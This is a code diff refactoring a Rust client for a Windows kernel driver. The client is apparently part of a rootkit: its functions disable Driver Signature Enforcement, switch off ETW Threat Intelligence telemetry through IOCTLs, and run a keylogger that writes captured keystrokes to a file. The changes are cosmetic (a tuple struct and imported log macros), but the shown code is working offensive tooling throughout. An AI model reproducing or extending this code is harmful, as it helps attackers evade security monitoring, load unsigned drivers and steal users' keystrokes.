@@ -7,6 +7,7 @@ use std::{
     time::Duration,
 };
 
+use log::{info, error, debug};
 use windows_sys::Win32::{
     Foundation::{
         CloseHandle, GetLastError, 
@@ -33,9 +34,7 @@ pub static mut KEY_RECENT: [u8; 64] = [0; 64];
 
 /// Provides miscellaneous system functionalities through a driver interface, such as
 /// Driver Signature Enforcement (DSE) toggling, ETWTI management, and keylogging.
-pub struct Misc {
-    driver_handle: HANDLE,
-}
+pub struct Misc(HANDLE);
 
 impl Misc {
     /// Creates a new `Misc` instance, opening a handle to the driver.
@@ -48,8 +47,8 @@ impl Misc {
     ///
     /// Panics if the driver cannot be opened.
     pub fn new() -> Self {
-        let driver_handle = open_driver().expect("Error");
-        Misc { driver_handle }
+        let h_driver = open_driver().expect("Error");
+        Self(h_driver)
     }
 
     /// Enables or disables Driver Signature Enforcement (DSE).
@@ -59,14 +58,14 @@ impl Misc {
     /// * `ioctl_code` - The IOCTL code for the DSE operation.
     /// * `enable` - `true` to enable DSE or `false` to disable it.
     pub fn dse(self, ioctl_code: u32, enable: bool) {
-        log::debug!("Preparing DSE structure for {}", if enable { "enabling" } else { "disabling" });
+        debug!("Preparing DSE structure for {}", if enable { "enabling" } else { "disabling" });
         let mut info_dse = DSE { enable };
 
-        log::debug!("Sending DeviceIoControl command to {} DSE", if enable { "enable" } else { "disable" });
+        debug!("Sending DeviceIoControl command to {} DSE", if enable { "enable" } else { "disable" });
         let mut return_buffer = 0;
         let status = unsafe {
             DeviceIoControl(
-                self.driver_handle,
+                self.0,
                 ioctl_code,
                 &mut info_dse as *mut _ as *mut c_void,
                 size_of::<DSE>() as u32,
@@ -78,9 +77,9 @@ impl Misc {
         };
 
         if status == 0 {
-            log::error!("DeviceIoControl failed with status: 0x{:08X}", unsafe { GetLastError() });
+            error!("DeviceIoControl failed with status: 0x{:08X}", unsafe { GetLastError() });
         } else {
-            log::info!("Driver Signature Enforcement (DSE) {}", if enable { "enable" } else { "disable" });
+            info!("Driver Signature Enforcement (DSE) {}", if enable { "enable" } else { "disable" });
         }
     }
 
@@ -95,7 +94,7 @@ impl Misc {
             let mut address = 0usize;
             let mut return_buffer = 0;
             let status = DeviceIoControl(
-                self.driver_handle,
+                self.0,
                 ioctl_code,
                 null_mut(),
                 0,
@@ -106,7 +105,7 @@ impl Misc {
             );
 
             if status == 0 {
-                log::error!("DeviceIoControl Failed With Status: 0x{:08X}", GetLastError());
+                error!("DeviceIoControl Failed With Status: 0x{:08X}", GetLastError());
                 return;
             }
 
@@ -141,7 +140,7 @@ impl Misc {
                     for i in 0..256 {
                         if key_pressed(i as u8) {
                             let key = vk_to_char(i as u8);
-                            log::debug!("{key}");
+                            debug!("{key}");
                             writeln!(writer, "{}", key).expect("Failed to write to file");
                             writer.flush().expect("Failed to flush file buffer");
                         }
@@ -162,14 +161,14 @@ impl Misc {
     /// * `ioctl_code` - The IOCTL code for the ETWTI operation.
     /// * `enable` - `true` to enable ETWTI or `false` to disable it.
     pub fn etwti(self, ioctl_code: u32, enable: bool) {
-        log::debug!("Preparing ETWTI structure for {}", if enable { "enabling" } else { "disabling" });
+        debug!("Preparing ETWTI structure for {}", if enable { "enabling" } else { "disabling" });
         let mut etwti = ETWTI { enable };
 
-        log::debug!("Sending DeviceIoControl command to {} ETWTI", if enable { "enable" } else { "disable" });
+        debug!("Sending DeviceIoControl command to {} ETWTI", if enable { "enable" } else { "disable" });
         let mut return_buffer = 0;
         let status = unsafe {
             DeviceIoControl(
-                self.driver_handle,
+                self.0,
                 ioctl_code,
                 &mut etwti as *mut _ as *mut c_void,
                 std::mem::size_of::<ETWTI>() as u32,
@@ -181,9 +180,9 @@ impl Misc {
         };
 
         if status == 0 {
-            log::error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
+            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
         } else {
-            log::info!("ETWTI {}", if enable { "enable" } else { "disable" })
+            info!("ETWTI {}", if enable { "enable" } else { "disable" })
         }
     }
 }
@@ -191,7 +190,7 @@ impl Misc {
 impl Drop for Misc {
     /// Ensures the driver handle is closed when `Misc` goes out of scope.
     fn drop(&mut self) {
-        log::debug!("Closing the driver handle");
-        unsafe { CloseHandle(self.driver_handle) };
+        debug!("Closing the driver handle");
+        unsafe { CloseHandle(self.0) };
     }
 }
